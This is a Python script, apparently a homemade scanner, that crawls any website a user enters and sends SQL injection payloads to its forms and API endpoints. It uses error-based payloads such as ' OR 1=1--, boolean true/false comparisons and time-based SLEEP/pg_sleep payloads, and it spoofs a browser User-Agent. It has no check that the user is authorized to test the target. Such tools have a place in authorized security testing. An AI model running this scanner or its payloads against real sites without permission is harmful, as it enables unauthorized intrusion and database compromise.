import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin , urlparse
from collections import deque
import re
import json
import time
import statistics


s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"


def get_forms(url):
    try:
        resp = s.get(url, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Failed to fetch {url}: {e}")
        return []
    # Keep this function form-only: non-HTML pages are skipped here.
    # API endpoints are discovered/tested via crawl + endpoint extraction.
    content_type = resp.headers.get("Content-Type", "").lower()
    if "html" not in content_type:
        print(f"[!] Skipping non-HTML content at {url}: {content_type}")    
        return []
    try:
        soup = BeautifulSoup(resp.content, "html.parser")
    except Exception as e:
        print(f"[!] Failed to parse HTML from {url}: {e}")
        return []
    return soup.find_all("form")

def test_json_sqli(url):
    payloads = [
        "' OR 1=1--",
        "' OR '1'='1",
        "\" OR 1=1--",
        "' OR 1=1#"
    ]

    headers = {
        "Content-Type": "application/json"
    }

    for payload in payloads:
        json_data = {
            "email": payload,
            "username": payload,
            "password": payload
        }

        try:
            res = s.post(url, json=json_data, headers=headers, timeout=5)

            if detect_sql_error(res):
                print(f"[!!!] SQL Injection vulnerability detected (JSON) at {url}")
                return True

        except requests.exceptions.RequestException:
            continue

    return False


API_PATTERNS = [
    r'/api/[a-zA-Z0-9/_-]+',
    r'/rest/[a-zA-Z0-9/_-]+',
    r'/auth/[a-zA-Z0-9/_-]+',
    r'/user/[a-zA-Z0-9/_-]+'
]

def extract_api_endpoints(soup, base_url):
    endpoints = set()

    # Check inline JS
    for script in soup.find_all("script"):
        if script.string:
            content = script.string
            for pattern in API_PATTERNS:
                matches = re.findall(pattern, content)
                for match in matches:
                    endpoints.add(urljoin(base_url, match))

    # Check external JS files
    for script in soup.find_all("script", src=True):
        js_url = urljoin(base_url, script["src"])
        try:
            r = s.get(js_url, timeout=5)
            ct = r.headers.get("Content-Type", "").lower()
            # ensure JS/text before scanning
            if not any(x in ct for x in ("javascript", "text")):
                continue
            for pattern in API_PATTERNS:
                matches = re.findall(pattern, r.text)
                for match in matches:
                    endpoints.add(urljoin(base_url, match))
        except requests.RequestException:
            continue

    return list(endpoints)

def extract_js_endpoints(soup, base_url):
    endpoints = set()

    # Common auth-related keywords
    keywords = ["login", "signup", "register", "auth", "account", "search.php", "artists.php", "categories.php", "product.php?id="]

    for script in soup.find_all("script"):
        if not script.string:
            continue

        content = script.string.lower()

        for keyword in keywords:
            if keyword in content:
                # extract possible paths like "/login" or "/api/auth"
                matches = re.findall(r'["\'](\/[^"\']+)["\']', content)
                for match in matches:
                    full_url = urljoin(base_url, match)
                    endpoints.add(full_url)

    return list(endpoints)


def crawl_throu(url, visited):
    try:
        resp = s.get(url, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Failed to fetch {url}: {e}")
        return []
    try:
        soup = BeautifulSoup(resp.content, "html.parser")
    except Exception as e:
        print(f"[!] Failed to parse HTML from {url}: {e}")
        return []
    
    links = []
    js_links = extract_js_endpoints(soup, url)
    # Extract API-like endpoints from inline/external JS for queue expansion.
    api_links = extract_api_endpoints(soup, url)
    base_domain = urlparse(url).netloc
    unwanted_extensions = [
    ".pdf", ".jpg", ".png", ".zip", ".exe",
    ".mp4", ".mp3", ".doc", ".docx"
    ]
    for link in soup.find_all("a", href=True):
        sub_link = link.get("href")
        sub_link = sub_link.strip()
        sub_link = sub_link.rstrip("\\") 
        if not sub_link or not isinstance(sub_link, str):
            continue
        sub_lower = sub_link.lower()
        if sub_lower.startswith("#") or sub_lower.startswith("mailto:") or "javascript:" in sub_lower:
            continue
        full_url = urljoin(url, sub_link)
        parsed = urlparse(full_url)

        # normalize and skip non-http schemes
        if parsed.scheme not in ("http", "https"):
            continue

        # append common auth-like paths quickly
        if any(word in full_url.lower() for word in ["login", "signup", "register", "auth"]):
            try:
                full_url = parsed._replace(fragment="").geturl()
            except Exception:
                pass
            if full_url not in visited and full_url not in links:
                links.append(full_url)
            # continue crawling other links, don't skip further checks

        # filter by unwanted extensions using the path
        if any(parsed.path.lower().endswith(ext) for ext in unwanted_extensions):
            continue

        low = full_url.lower()
        if any(word in low for word in ["exit", "admin", "dashboard", "manage"]):
            continue

        if parsed.netloc != base_domain:
            continue

        try:
            full_url = parsed._replace(fragment="").geturl()
        except Exception:
            pass

        if full_url not in visited and full_url not in links:
            links.append(full_url)
    for js_link in js_links:
        if js_link not in visited and js_link not in links:
            links.append(js_link)

    for api_link in api_links:
        if api_link not in visited and api_link not in links:
            links.append(api_link)

    return links

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({
            "type": input_type,
            "name": input_name,
            "value": input_value
        })
    for textarea_tag in form.find_all("textarea"):
        input_type = textarea_tag.attrs.get("type", "text")
        input_name = textarea_tag.attrs.get("name")
        input_value = textarea_tag.text
        inputs.append({
            "type": input_type,
            "name": input_name,
            "value": input_value
        })


    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


SQL_ERRORS = [
    "sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlite error",
    "psql error",
    "odbc sql server driver",
    "mysql_fetch",
    "syntax error",
    "database error"
]

def detect_sql_error(response):
    content = response.text.lower()
    return any(error in content for error in SQL_ERRORS)



def test_sql_injection(url):
    visited = set()
    tested_api = set()
    valid_forms = []
    queue = deque([(url, 0)])
    max_depth = 3
    while queue:
        current_url, depth = queue.popleft()
        if depth > max_depth:
            continue
        if current_url in visited:
            continue
        # print(f"added{current_url}") 
        visited.add(current_url)   

        # API checks run independently of form parsing so non-HTML API URLs still get tested.
        if any(keyword in current_url.lower() for keyword in ["api", "rest", "auth", "login"]):
            if current_url not in tested_api:
                print(f"[+] Testing API endpoint: {current_url}")
                test_json_sqli(current_url)
                test_boolean_sqli(current_url)
                ok, ev = test_time_sqli_json(current_url)
                if ok:
                    print(f"[!!!] Time-based JSON SQLi possible at {ev['url']} diff={ev['diff']:.1f}s payload={ev['payload']}")
                tested_api.add(current_url)

        # Form checks only run on HTML pages returned by get_forms.
        forms = get_forms(current_url)
        if forms:
            valid_forms.append((forms, current_url))    
            print(f"added {current_url}")
        url_list = crawl_throu(current_url, visited)
        for link in url_list:
            if link not in visited:
                queue.append((link, depth + 1))
            # if current_url not in visited:    
            #     print(f"added{current_url}") 
    print(f"[+] Detected {len(valid_forms)} forms on {url}.")

    for form_list, link in valid_forms:
        for form in form_list:
            details = get_form_details(form)
            vulnerable = False
            # after you get `details = get_form_details(form)` and after your boolean/error tests:
            ok, ev = test_time_sqli_form(details, link)
            if ok:
                print(f"[!!!] Time-based SQLi possible at {ev['action']} (page {link}) diff={ev['diff']:.1f}s payload={ev['payload']}")

            for i in ['"',"'"]:
                data = {}
                for input_tag in details["inputs"]:
                    if input_tag["name"] is None:
                        continue
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        data[input_tag["name"]] = input_tag["value"] + i
                    else:
                        data[input_tag["name"]] = f"test{i}"
                action = details["action"] or link
                target_url  = urljoin(link, action)
                if details["method"] == "post":
                    try:
                        res = s.post(target_url, data=data, timeout=10)
                    except requests.RequestException as e:
                        print(f"[!] Request failed for {target_url} (POST): {e}")
                        continue
                else:
                    try:
                        res = s.get(target_url, params=data, timeout=10)
                    except requests.RequestException as e:
                        print(f"[!] Request failed for {target_url} (GET): {e}")
                        continue
                if detect_sql_error(res):
                    print(f"[!!!] SQL Injection vulnerability detected in form at {target_url} in {link}")
                    vulnerable = True
                    break
                
            

            if not vulnerable:
                print(f" No SQL Injection vulnerability detected in form at {link}")
                
                
                
                
# -------- Boolean based detection ---------

def normalize_response(text):
    # Remove numbers (IDs, timestamps, tokens)
    text = re.sub(r'\d+', '', text)

    # Remove extra whitespace
    text = re.sub(r'\s+', ' ', text)

    return text.strip().lower()


def get_json_structure(text):
    try:
        data = json.loads(text)
        return sorted(data.keys())
    except:
        return None



def test_boolean_sqli(url):
    normal_data = {
        "email" : "example@gmail.com",
        "password" : "testpassword"
        }
    true_payload = "' OR 1=1--"
    false_payload = "' OR 1=2--"

    data_true = {
        "email": true_payload,
        "password": true_payload
    }

    data_false = {
        "email": false_payload,
        "password": false_payload
    }

    headers = {
        "Content-Type": "application/json"
    }

    try:
        res_normal = s.post(url, json=normal_data, headers=headers, timeout=10)
        normal_text = normalize_response(res_normal.text) 
        res_true = s.post(url, json=data_true, headers=headers, timeout=10)
        true_text = normalize_response(res_true.text)
        res_false = s.post(url, json=data_false, headers=headers, timeout=10)
        false_text = normalize_response(res_false.text)

        # Compare JSON structure
        normal_struct = get_json_structure(res_normal.text)
        true_struct = get_json_structure(res_true.text)
        false_struct = get_json_structure(res_false.text)
        
        if true_struct and false_struct:
            if true_struct != false_struct or true_struct != normal_struct:
                print(f"[!!!] Possible Boolean-based SQLi (JSON structure change) at {url}")
                return True

        if res_true.status_code == res_false.status_code == res_normal.status_code:
            if abs(len(true_text) - len(false_text)) > 20:
                print(f"[!!!] Possible Boolean-based SQLi at {url}")
                return True
        if len(true_text) != len(false_text):
                print(f"[!!!] Possible Boolean-based SQLi at {url}")
                return True
        if len(normal_text) != len(true_text):
                print(f"[!!!] Possible Boolean-based SQLi at {url}")
                return True
                # Keyword-based detection
        keywords = ["welcome", "success", "invalid", "error"]

        for word in keywords:
            if word in true_text and word not in false_text:
                print(f"[!!!] Possible Boolean-based SQLi (keyword diff) at {url}")
                return True
    except requests.exceptions.RequestException:
        pass

    return False




# ------ time based deteaction ------


# Configuration
TIME_PAYLOADS = [
    # MySQL / MariaDB style
    "' OR SLEEP(5)-- ",
    '" OR SLEEP(5)-- ',
    # Postgres style
    "'; SELECT pg_sleep(5)-- ",
    '"; SELECT pg_sleep(5)-- '
]
TIME_THRESHOLD = 4.0   # seconds difference to treat as suspicious (tune per network)
TRIALS = 2             # number of trials to average (2 is a minimum)

def _elapsed_request(method, target, **kwargs):
    """Send a request and return elapsed seconds or None on failure."""
    try:
        start = time.time()
        if method.lower() == "post":
            r = s.post(target, **kwargs)
        else:
            r = s.get(target, **kwargs)
        return time.time() - start
    except requests.RequestException:
        return None

def test_time_sqli_form(details, page_url, threshold=TIME_THRESHOLD, trials=TRIALS):
    """
    details: the dict returned by get_form_details(form)
    page_url: the URL of the page where the form was found (use for urljoin)
    Returns (bool, evidence dict)
    """
    action = details.get("action") or page_url
    method = details.get("method", "get").lower()

    # prepare a simple baseline payload (use existing values or 'test')
    baseline_data = {}
    for inp in details["inputs"]:
        name = inp.get("name")
        if not name:
            continue
        baseline_data[name] = inp.get("value") or "test"

    # measure baseline average
    baseline_times = []
    for _ in range(trials):
        target_url = urljoin(page_url, action)
        elapsed = _elapsed_request(method, target_url, data=baseline_data) if method == "post" else _elapsed_request("get", target_url, params=baseline_data)
        if elapsed is None:
            return False, {"reason": "request_failed_baseline"}
        baseline_times.append(elapsed)
    baseline_avg = statistics.mean(baseline_times)

    # try each time payload by injecting into one or more parameters
    for payload in TIME_PAYLOADS:
        # build payload data by appending time payload to fields (prefer text fields)
        data = {}
        for inp in details["inputs"]:
            name = inp.get("name")
            if not name:
                continue
            # if hidden or has value, append payload to that value; else use test + payload
            if inp.get("type") == "hidden" or inp.get("value"):
                data[name] = (inp.get("value") or "") + payload
            else:
                data[name] = "test" + payload

        # perform trials and compute average
        times = []
        for _ in range(trials):
            target_url = urljoin(page_url, action)
            elapsed = _elapsed_request(method, target_url, data=data) if method == "post" else _elapsed_request("get", target_url, params=data)
            if elapsed is None:
                times = []
                break
            times.append(elapsed)
        if not times:
            continue
        avg = statistics.mean(times)

        # suspicious if avg - baseline_avg >= threshold
        if avg - baseline_avg >= threshold and avg >= 4:
            evidence = {
                "type": "time",
                "payload": payload,
                "baseline_avg": baseline_avg,
                "avg": avg,
                "diff": avg - baseline_avg,
                "action": action
            }
            return True, evidence

    return False, None


def test_time_sqli_json(api_url, threshold=TIME_THRESHOLD, trials=TRIALS):
    """
    Send baseline JSON and time-payload JSONs to api_url.
    Returns (bool, evidence)
    """
    headers = {"Content-Type": "application/json"}

    # baseline JSON - pick common fields that APIs expect
    baseline_json = {"email": "test@example.com", "password": "wrongpass"}

    # measure baseline average
    baseline_times = []
    for _ in range(trials):
        t = _elapsed_request("post", api_url, json=baseline_json, headers=headers, timeout=10)
        if t is None:
            return False, {"reason": "request_failed_baseline"}
        baseline_times.append(t)
    baseline_avg = statistics.mean(baseline_times)

    for payload in TIME_PAYLOADS:
        json_payload = {"email": payload, "password": payload}
        times = []
        for _ in range(trials):
            t = _elapsed_request("post", api_url, json=json_payload, headers=headers, timeout=10)
            if t is None:
                times = []
                break
            times.append(t)
        if not times:
            continue
        avg = statistics.mean(times)
        if avg - baseline_avg >= threshold:
            evidence = {
                "type": "time-json",
                "payload": payload,
                "baseline_avg": baseline_avg,
                "avg": avg,
                "diff": avg - baseline_avg,
                "url": api_url
            }
            return True, evidence

    return False, None






if __name__ == "__main__":
    try:
        url = input("Enter the URL to test for SQL Injection: ").strip()
        if not url:
            print("[!] No URL provided.")
        else:
            test_sql_injection(url)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
